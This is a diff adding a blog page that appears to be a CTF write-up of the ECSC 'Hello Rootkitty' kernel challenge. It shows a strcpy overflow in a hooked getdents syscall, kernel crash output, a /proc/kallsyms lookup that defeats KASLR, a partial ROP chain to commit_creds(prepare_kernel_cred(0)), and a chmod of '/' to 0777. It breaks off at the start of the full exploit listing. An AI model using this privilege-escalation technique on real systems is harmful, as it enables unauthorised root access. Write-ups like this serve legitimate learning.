@@ -1,0 +1,1583 @@
+<!DOCTYPE html>
+<html lang="en-en">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.52 with theme Tranquilpeak 0.4.3-SNAPSHOT">
+<meta name="author" content="Hugo VINCENT">
+<meta name="keywords" content="pwn, kernel, rop, blog, hacking, cybersecurity, infosec, hack, hugow, ctf, write-up, wu, hacking">
+<meta name="description" content="Event Challenge Category Points Solves     ecsc Hello Rootkitty pwn 500 24    TL;DR A custom kernel module was vulnerable to a buffer overflow, with a small ropchain I escalated my privileges to root and with a sys_chmod syscalls I got the flag.
+Description    Recon I&rsquo;m not a Linux kernel expert, everything might not be 100% correct, but I&rsquo;ll do my best to summarize what I understood.">
+
+
+<meta property="og:description" content="Event Challenge Category Points Solves     ecsc Hello Rootkitty pwn 500 24    TL;DR A custom kernel module was vulnerable to a buffer overflow, with a small ropchain I escalated my privileges to root and with a sys_chmod syscalls I got the flag.
+Description    Recon I&rsquo;m not a Linux kernel expert, everything might not be 100% correct, but I&rsquo;ll do my best to summarize what I understood.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hello Rootkitty">
+<meta name="twitter:title" content="Hello Rootkitty">
+<meta property="og:url" content="https://hug0vincent.github.io/2020/05/hello-rootkitty/">
+<meta property="twitter:url" content="https://hug0vincent.github.io/2020/05/hello-rootkitty/">
+<meta property="og:site_name" content="Hugo">
+<meta property="og:description" content="Event Challenge Category Points Solves     ecsc Hello Rootkitty pwn 500 24    TL;DR A custom kernel module was vulnerable to a buffer overflow, with a small ropchain I escalated my privileges to root and with a sys_chmod syscalls I got the flag.
+Description    Recon I&rsquo;m not a Linux kernel expert, everything might not be 100% correct, but I&rsquo;ll do my best to summarize what I understood.">
+<meta name="twitter:description" content="Event Challenge Category Points Solves     ecsc Hello Rootkitty pwn 500 24    TL;DR A custom kernel module was vulnerable to a buffer overflow, with a small ropchain I escalated my privileges to root and with a sys_chmod syscalls I got the flag.
+Description    Recon I&rsquo;m not a Linux kernel expert, everything might not be 100% correct, but I&rsquo;ll do my best to summarize what I understood.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2020-05-07T18:03:45">
+  
+  
+    <meta property="article:modified_time" content="2020-05-07T18:03:45">
+  
+  
+  
+    
+      <meta property="article:section" content="write-ups">
+    
+      <meta property="article:section" content="ecsc">
+    
+  
+  
+    
+      <meta property="article:tag" content="pwn">
+    
+      <meta property="article:tag" content="kernel">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://hug0vincent.github.io/images/HelloRootkitty/root1.png">
+  <meta property="twitter:image" content="https://hug0vincent.github.io/images/HelloRootkitty/root1.png">
+
+
+
+
+  <meta property="og:image" content="https://hug0vincent.github.io/images/profil.jpg">
+  <meta property="twitter:image" content="https://hug0vincent.github.io/images/profil.jpg">
+
+
+    <title>Hello Rootkitty</title>
+
+    <link rel="icon" href="https://hug0vincent.github.io/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://hug0vincent.github.io/2020/05/hello-rootkitty/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+
+    
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,300i,400,700,700i&amp;subset=cyrillic,cyrillic-ext,latin-ext" rel="stylesheet"> 
+
+    
+    <link rel="stylesheet" href="https://hug0vincent.github.io/css/style-2wfjlq5nwe9qjygqo9yarila7qvjwdmv.min.css" />
+    
+    
+      
+        <link rel="stylesheet"  href="https://hug0vincent.github.io/css/custom.css">
+      
+    
+
+    
+      
+    
+    
+
+    <script type="text/javascript">
+      window.heap=window.heap||[],heap.load=function(e,t){window.heap.appid=e,window.heap.config=t=t||{};var r=t.forceSSL||"https:"===document.location.protocol,a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=(r?"https:":"http:")+"//cdn.heapanalytics.com/js/heap-"+e+".js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(a,n);for(var o=function(e){return function(){heap.push([e].concat(Array.prototype.slice.call(arguments,0)))}},p=["addEventProperties","addUserProperties","clearEventProperties","identify","resetIdentity","removeEventProperty","setEventProperties","track","unsetEventProperty"],c=0;c<p.length;c++)heap[p[c]]=o(p[c])};
+        heap.load("381812841");
+  </script>
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://hug0vincent.github.io/">Hugo</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://hug0vincent.github.io/page/about/">
+    
+    
+    
+      
+        <img class="header-picture" src="https://hug0vincent.github.io/images/profil.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://hug0vincent.github.io/page/about/">
+          <img class="sidebar-profile-picture" src="https://hug0vincent.github.io/images/profil.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Hugo VINCENT</h4>
+        
+          <h5 class="sidebar-profile-bio">Student in computer security</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/categories/posts">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-pencil"></i>
+      
+      <span class="sidebar-button-desc">Posts</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/categories/write-ups">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Write-Ups</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/page/about/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Hug0Vincent" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.root-me.org/hugow?lang=fr#70a472fd3f9279cb9095ce7cbd2cad00" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon rootme_logo "></i>
+      
+      <span class="sidebar-button-desc">Root-me</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/hugow_vincent" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.instagram.com/hugo_vincent__/" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-instagram "></i>
+      
+      <span class="sidebar-button-desc">Instagram</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              post-header-cover--full"
+       style="background-image:url('/images/HelloRootkitty/root1.png')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      Hello Rootkitty
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2020-05-07T18:03:45&#43;02:00">
+        
+  May 7, 2020
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://hug0vincent.github.io/categories/write-ups">write-ups</a>, 
+    
+      <a class="category-link" href="https://hug0vincent.github.io/categories/ecsc">ecsc</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              
+
+<table>
+<thead>
+<tr>
+<th align="center">Event</th>
+<th align="center">Challenge</th>
+<th align="center">Category</th>
+<th align="center">Points</th>
+<th align="center">Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td align="center">ecsc</td>
+<td align="center">Hello Rootkitty</td>
+<td align="center">pwn</td>
+<td align="center">500</td>
+<td align="center">24</td>
+</tr>
+</tbody>
+</table>
+
+<h1 id="tl-dr">TL;DR</h1>
+
+<p>A custom kernel module was vulnerable to a buffer overflow, with a small ropchain I escalated my privileges to root and with a sys_chmod syscalls I got the flag.</p>
+
+<h1 id="description">Description</h1>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure center" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/HelloRootkitty/description.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/HelloRootkitty/description.png" style="width: 50%;height: 50%;">
+  
+    </a>
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<h1 id="recon">Recon</h1>
+
+<p>I&rsquo;m not a Linux kernel expert, everything might not be 100% correct, but I&rsquo;ll do my best to summarize what I understood.</p>
+
+<p>We were provided with 3 files, a bzImage, an iniramfs and a custom kernel module. I tried to run everything locally with qemu, but It didn&rsquo;t work the provided initramfs was broken, so let run the virtual machine on the server and see what happen.</p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure center" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/HelloRootkitty/root.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/HelloRootkitty/root.png" >
+  
+    </a>
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>It seems that the flag is located in the root directory, but the <em>XXXX</em> are a bit weird. We can create files and see what append inside the home folder of the current user:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight bash language-bash">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-bash"><code class="bash">~ $ touch ecsc_flag_aaaa
+~ $ ls -asl
+total 0
+     0 drwxrwxrwx    2 ctf      ctf              0 May  7 15:55 .
+     0 drwxr-xr-x    3 root     root             0 Feb 25 09:30 ..
+     0 -r--------    0 root     root             0 Jan  0  1900 ecsc_flag_XXXX
+~ $ touch ecsc_flag_bbbb
+~ $ ls -asl
+total 0
+     0 drwxrwxrwx    2 ctf      ctf              0 May  7 15:56 .
+     0 drwxr-xr-x    3 root     root             0 Feb 25 09:30 ..
+     0 -r--------    0 root     root             0 Jan  0  1900 ecsc_flag_XXXX
+     0 -r--------    0 root     root             0 Jan  0  1900 ecsc_flag_aaaa</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>It looks like the permission on files starting by ecsc_flag_ are modified.</p>
+
+<h2 id="static-analysis">Static analysis</h2>
+
+<p>Let&rsquo;s load the kernel module inside <span class="highlight-text orange">Ghidra</span> and search for interesting things. The module is not so big we can quickly spot what&rsquo;s going on, the <span class="highlight-text orange">init_module</span> function is responsible for the initialization of this custom module.</p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure center" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/HelloRootkitty/init_module.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/HelloRootkitty/init_module.png" >
+  
+    </a>
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p></br></p>
+
+<p>The module replaces the addresses of the original <span class="highlight-text orange">sys_getdents64</span>, <span class="highlight-text orange">sys_getdents</span> and <span class="highlight-text orange">sys_lstat</span> addresses by custom addresses which are function inside the module. The module is hooking legit function by a custom one. From the Linux man page we can read:</p>
+
+<blockquote class="pullquote ">
+	<p>
+getdents, getdents64 - get directory entries
+</p>
+</blockquote>
+
+<p>When we want to list entry in a directory this syscall is made and instead of the original one the Linux kernel will call the custom one. Here is a part of the custom sys_getdents function:</p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure center" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/HelloRootkitty/vuln.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/HelloRootkitty/vuln.png" >
+  
+    </a>
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>We can spot a <span class="highlight-text orange">strcpy</span> with only 2 parameters which mean a buffer overflow if we can control the second parameter. The second parameter comes from the second parameter of the sys_getdents function. Once again from the Linux man page:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">int getdents(unsigned int fd, struct linux_dirent *dirp,
+                    unsigned int count);
+int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+                    unsigned int count);</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>The second parameter is a pointer to a <span class="highlight-text orange">linux_dirent</span> structure. Here is the definition of such a structure:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">struct linux_dirent {
+    unsigned long  d_ino;     /* Inode number */
+    unsigned long  d_off;     /* Offset to next linux_dirent */
+    unsigned short d_reclen;  /* Length of this linux_dirent */
+    char           d_name[];  /* Filename (null-terminated) */
+                        /* length is actually (d_reclen - 2 -
+                        offsetof(struct linux_dirent, d_name)) */
+    /*
+    char           pad;       // Zero padding byte
+    char           d_type;    // File type (only since Linux
+                                // 2.6.4); offset is (d_reclen - 1)
+    */
+}</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>So at the offset 0x12 of a linux_dirent structure we can find the <span class="highlight-text orange">d_name</span> parameter. The little loop before the strcpy check that the name of the file start by <span class="highlight-text orange">ecsc_flag_</span>. We can try a buffer overflow with a long filename starting by ecsc_flag_ and see what append:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight bash language-bash">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-bash"><code class="bash">~ $ touch ecsc_flag_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+~ $ ls -asl
+general protection fault: 0000 [#1] NOPTI
+Modules linked in: ecsc(O)
+CPU: 0 PID: 63 Comm: ls Tainted: G           O    4.14.167 #11
+task: ffff9f6281e19100 task.stack: ffffb61dc009c000
+RIP: 0010:0x6161616161616161
+RSP: 0018:ffffb61dc009ff38 EFLAGS: 00000282
+RAX: 0000000000000170 RBX: 6161616161616161 RCX: 0000000000000000
+RDX: 00007ffd2cdac8a9 RSI: ffffb61dc009ff96 RDI: 00007ffd2cdac7d3
+RBP: 6161616161616161 R08: ffffb61dc009fed0 R09: ffffffffc0387024
+R10: ffffb61dc009fec0 R11: 6161616161616161 R12: 6161616161616161
+R13: 6161616161616161 R14: 0000000000000000 R15: 0000000000000000
+FS:  0000000000000000(0000) GS:ffffffff88a36000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: 00007ffd2cdac790 CR3: 0000000001e72000 CR4: 00000000000006b0
+Call Trace:
+Code:  Bad RIP value.
+RIP: 0x6161616161616161 RSP: ffffb61dc009ff38
+---[ end trace f622400f5523341b ]---
+Kernel panic - not syncing: Fatal exception
+Kernel Offset: 0x7000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+Rebooting in 1 seconds..</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>A kernel stack trace with <span class="highlight-text orange">RIP: 0010:0x6161616161616161</span>, we have full control over RIP we can start building our exploit.</p>
+
+<h1 id="ropping-through-hell">Ropping through hell</h1>
+
+<p>I though that it would be easy from here, but I actually spent a lot of time finding a good strategy to execute some privileges actions. My idea was initially to pop a root shell, let see the different steps to get there. First I tried to map a userland region as rwx and execute a custom shellcode from here, but I don&rsquo;t know why It didn&rsquo;t work. So I decided to make a ropchain.</p>
+
+<p>To elevate our privileges in kernel-land we need to make a call to this functions:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">commit_creds(prepare_kernel_cred(0));</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>This will grant us root privileges which mean that we will theoretically be able to do whatever we want on the system. To call these functions we need to know their addresses, <span class="highlight-text orange">kaslr</span> is enabled, but we can read <span class="highlight-text orange">/proc/kallsym</span> which hold all the kernel function addresses including the base offset, thus defeating kaslr.</p>
+
+<p>Here is a usefull function to get kernel addresses base on the symbol name :</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">unsigned long get_kernel_sym(char *name) {
+    FILE *f;
+    unsigned long addr;
+    char dummy;
+    char sname[256];
+    int ret = 0;
+
+
+    f = fopen(&#34;/proc/kallsyms&#34;, &#34;r&#34;);
+    if (f == NULL) {
+        printf(&#34;[-] Failed to open /proc/kallsyms\n&#34;);
+        exit(-1);
+    }
+    printf(&#34;[&#43;] Find %s...\n&#34;, name);
+    while(ret != EOF) {
+        ret = fscanf(f, &#34;%p %c %s\n&#34;, (void **)&amp;addr, &amp;dummy, sname);
+        if (ret == 0) {
+            fscanf(f, &#34;%s\n&#34;, sname);
+            continue;
+        }
+        if (!strcmp(name, sname)) {
+            fclose(f);
+            printf(&#34;[&#43;] Found %s at %lx\n&#34;, name, addr);
+            return addr;
+        }
+    }
+    fclose(f);
+    return 0;
+}</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>We can now compute the addresses of those functions, but we need gadgets, and there are not so many gadgets inside the kernel module. To get more gadgets I extracted the vmlinux from the bzImage with this <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">tool</a>. Then we can launch ROPgadet on the vmlinux and get a lot of gadgets. Here is the beginning of my ropchain:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">int main() {
+ 
+    int fd, nread;
+    char buf[BUF_SIZE];
+    struct linux_dirent *d;
+    char file_name[138] = &#34;/home/ctf/ecsc_flag_AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQQRRRRSSSSTTTTUUUUVVVVWWWWWXXXXYYYY&#34;;
+    char *p;
+    void *payload;
+    unsigned long  kernel_base, *fake_stack;
+
+    kernel_base = get_kernel_sym(&#34;startup_64&#34;); // get the kernel base address to compute real gadget address
+    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym(&#34;prepare_kernel_cred&#34;);
+    commit_creds = (commit_creds_t)get_kernel_sym(&#34;commit_creds&#34;);
+
+    payload = malloc(0x100);
+    memset(payload, 0x00, 0x100);
+
+    fake_stack = (unsigned long *)(payload);
+    *fake_stack &#43;&#43;= kernel_base &#43; 0x2d028f;           // xor rax, rax
+
+    *fake_stack &#43;&#43;= kernel_base &#43; 0x1cc22e;           //pop rcx; ret
+    *fake_stack &#43;&#43;= prepare_kernel_cred;
+    
+    *fake_stack &#43;&#43;= kernel_base &#43; 0xa3247;           //mov rdi, rax ; call rcx
+
+    *fake_stack &#43;&#43;= 0x4343434343434343;
+    
+    *fake_stack &#43;&#43;= kernel_base &#43; 0x1cc22e;          //pop rcx; ret
+    *fake_stack &#43;&#43;= commit_creds;
+    
+    *fake_stack &#43;&#43;= kernel_base &#43; 0xa3247;          // mov rdi, rax ; call rcx
+
+    [...]</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>After those gadget we will get root privileges, my naive idea was just to go back to a userland function and execute system(&ldquo;/bin/sh&rdquo;) but it didn&rsquo;t work I triggered segfault and I could only execute one printf and only one after that segfault.</p>
+
+<p>I successfully execute a printf which means that I still can execute code but not everything. I tried to execute a custom minimal shellcode to call execve(&lsquo;/bin/sh&rsquo;) but without success. I was probably messing up with the kernel stack so I either had to restore it or find another solution. I tried in vain to restore it and I also tried to make a stack pivot but no sucess.</p>
+
+<p>I also tried to execute a call to exit after the ropchain, it worked but printf and exit are pretty useless in our case. But something is happening, we can still make at least one syscall, what can we do with one sycall ?</p>
+
+<h1 id="one-syscall-to-rule-them-all">One syscall to rule them all</h1>
+
+<p>I used the sys_chmod sycall and It worked, no root shell but a root directory with rwx permission for everybody. I also tried to put the suid bit on /bin/sh but it didn&rsquo;t work.</p>
+
+<p>First a syscall to chmod:</p>
+
+<ul>
+<li>syscall(SYS_chmod, &ldquo;/&rdquo;, 0777);</li>
+</ul>
+
+<p>Then I created a file starting by ecsc_flag_ inside the root folder to get the real name of the flag and then we can get the flag:</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-50" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/HelloRootkitty/root2.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/HelloRootkitty/root2.png" >
+  
+    </a>
+  
+  
+</div>
+
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-50" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/HelloRootkitty/root1.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/HelloRootkitty/root1.png" >
+  
+    </a>
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<h1 id="final-thought">Final thought</h1>
+
+<p>I saw other write-ups where people simply unload the kernel module and then print the flag which is more simple and less painful. I really wanted a root shell but I don&rsquo;t know why It didn&rsquo;t work since there is no SMEP or SMAP protection if someone has any idea please send me a message :)</p>
+
+<h1 id="full-exploit">Full exploit</h1>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 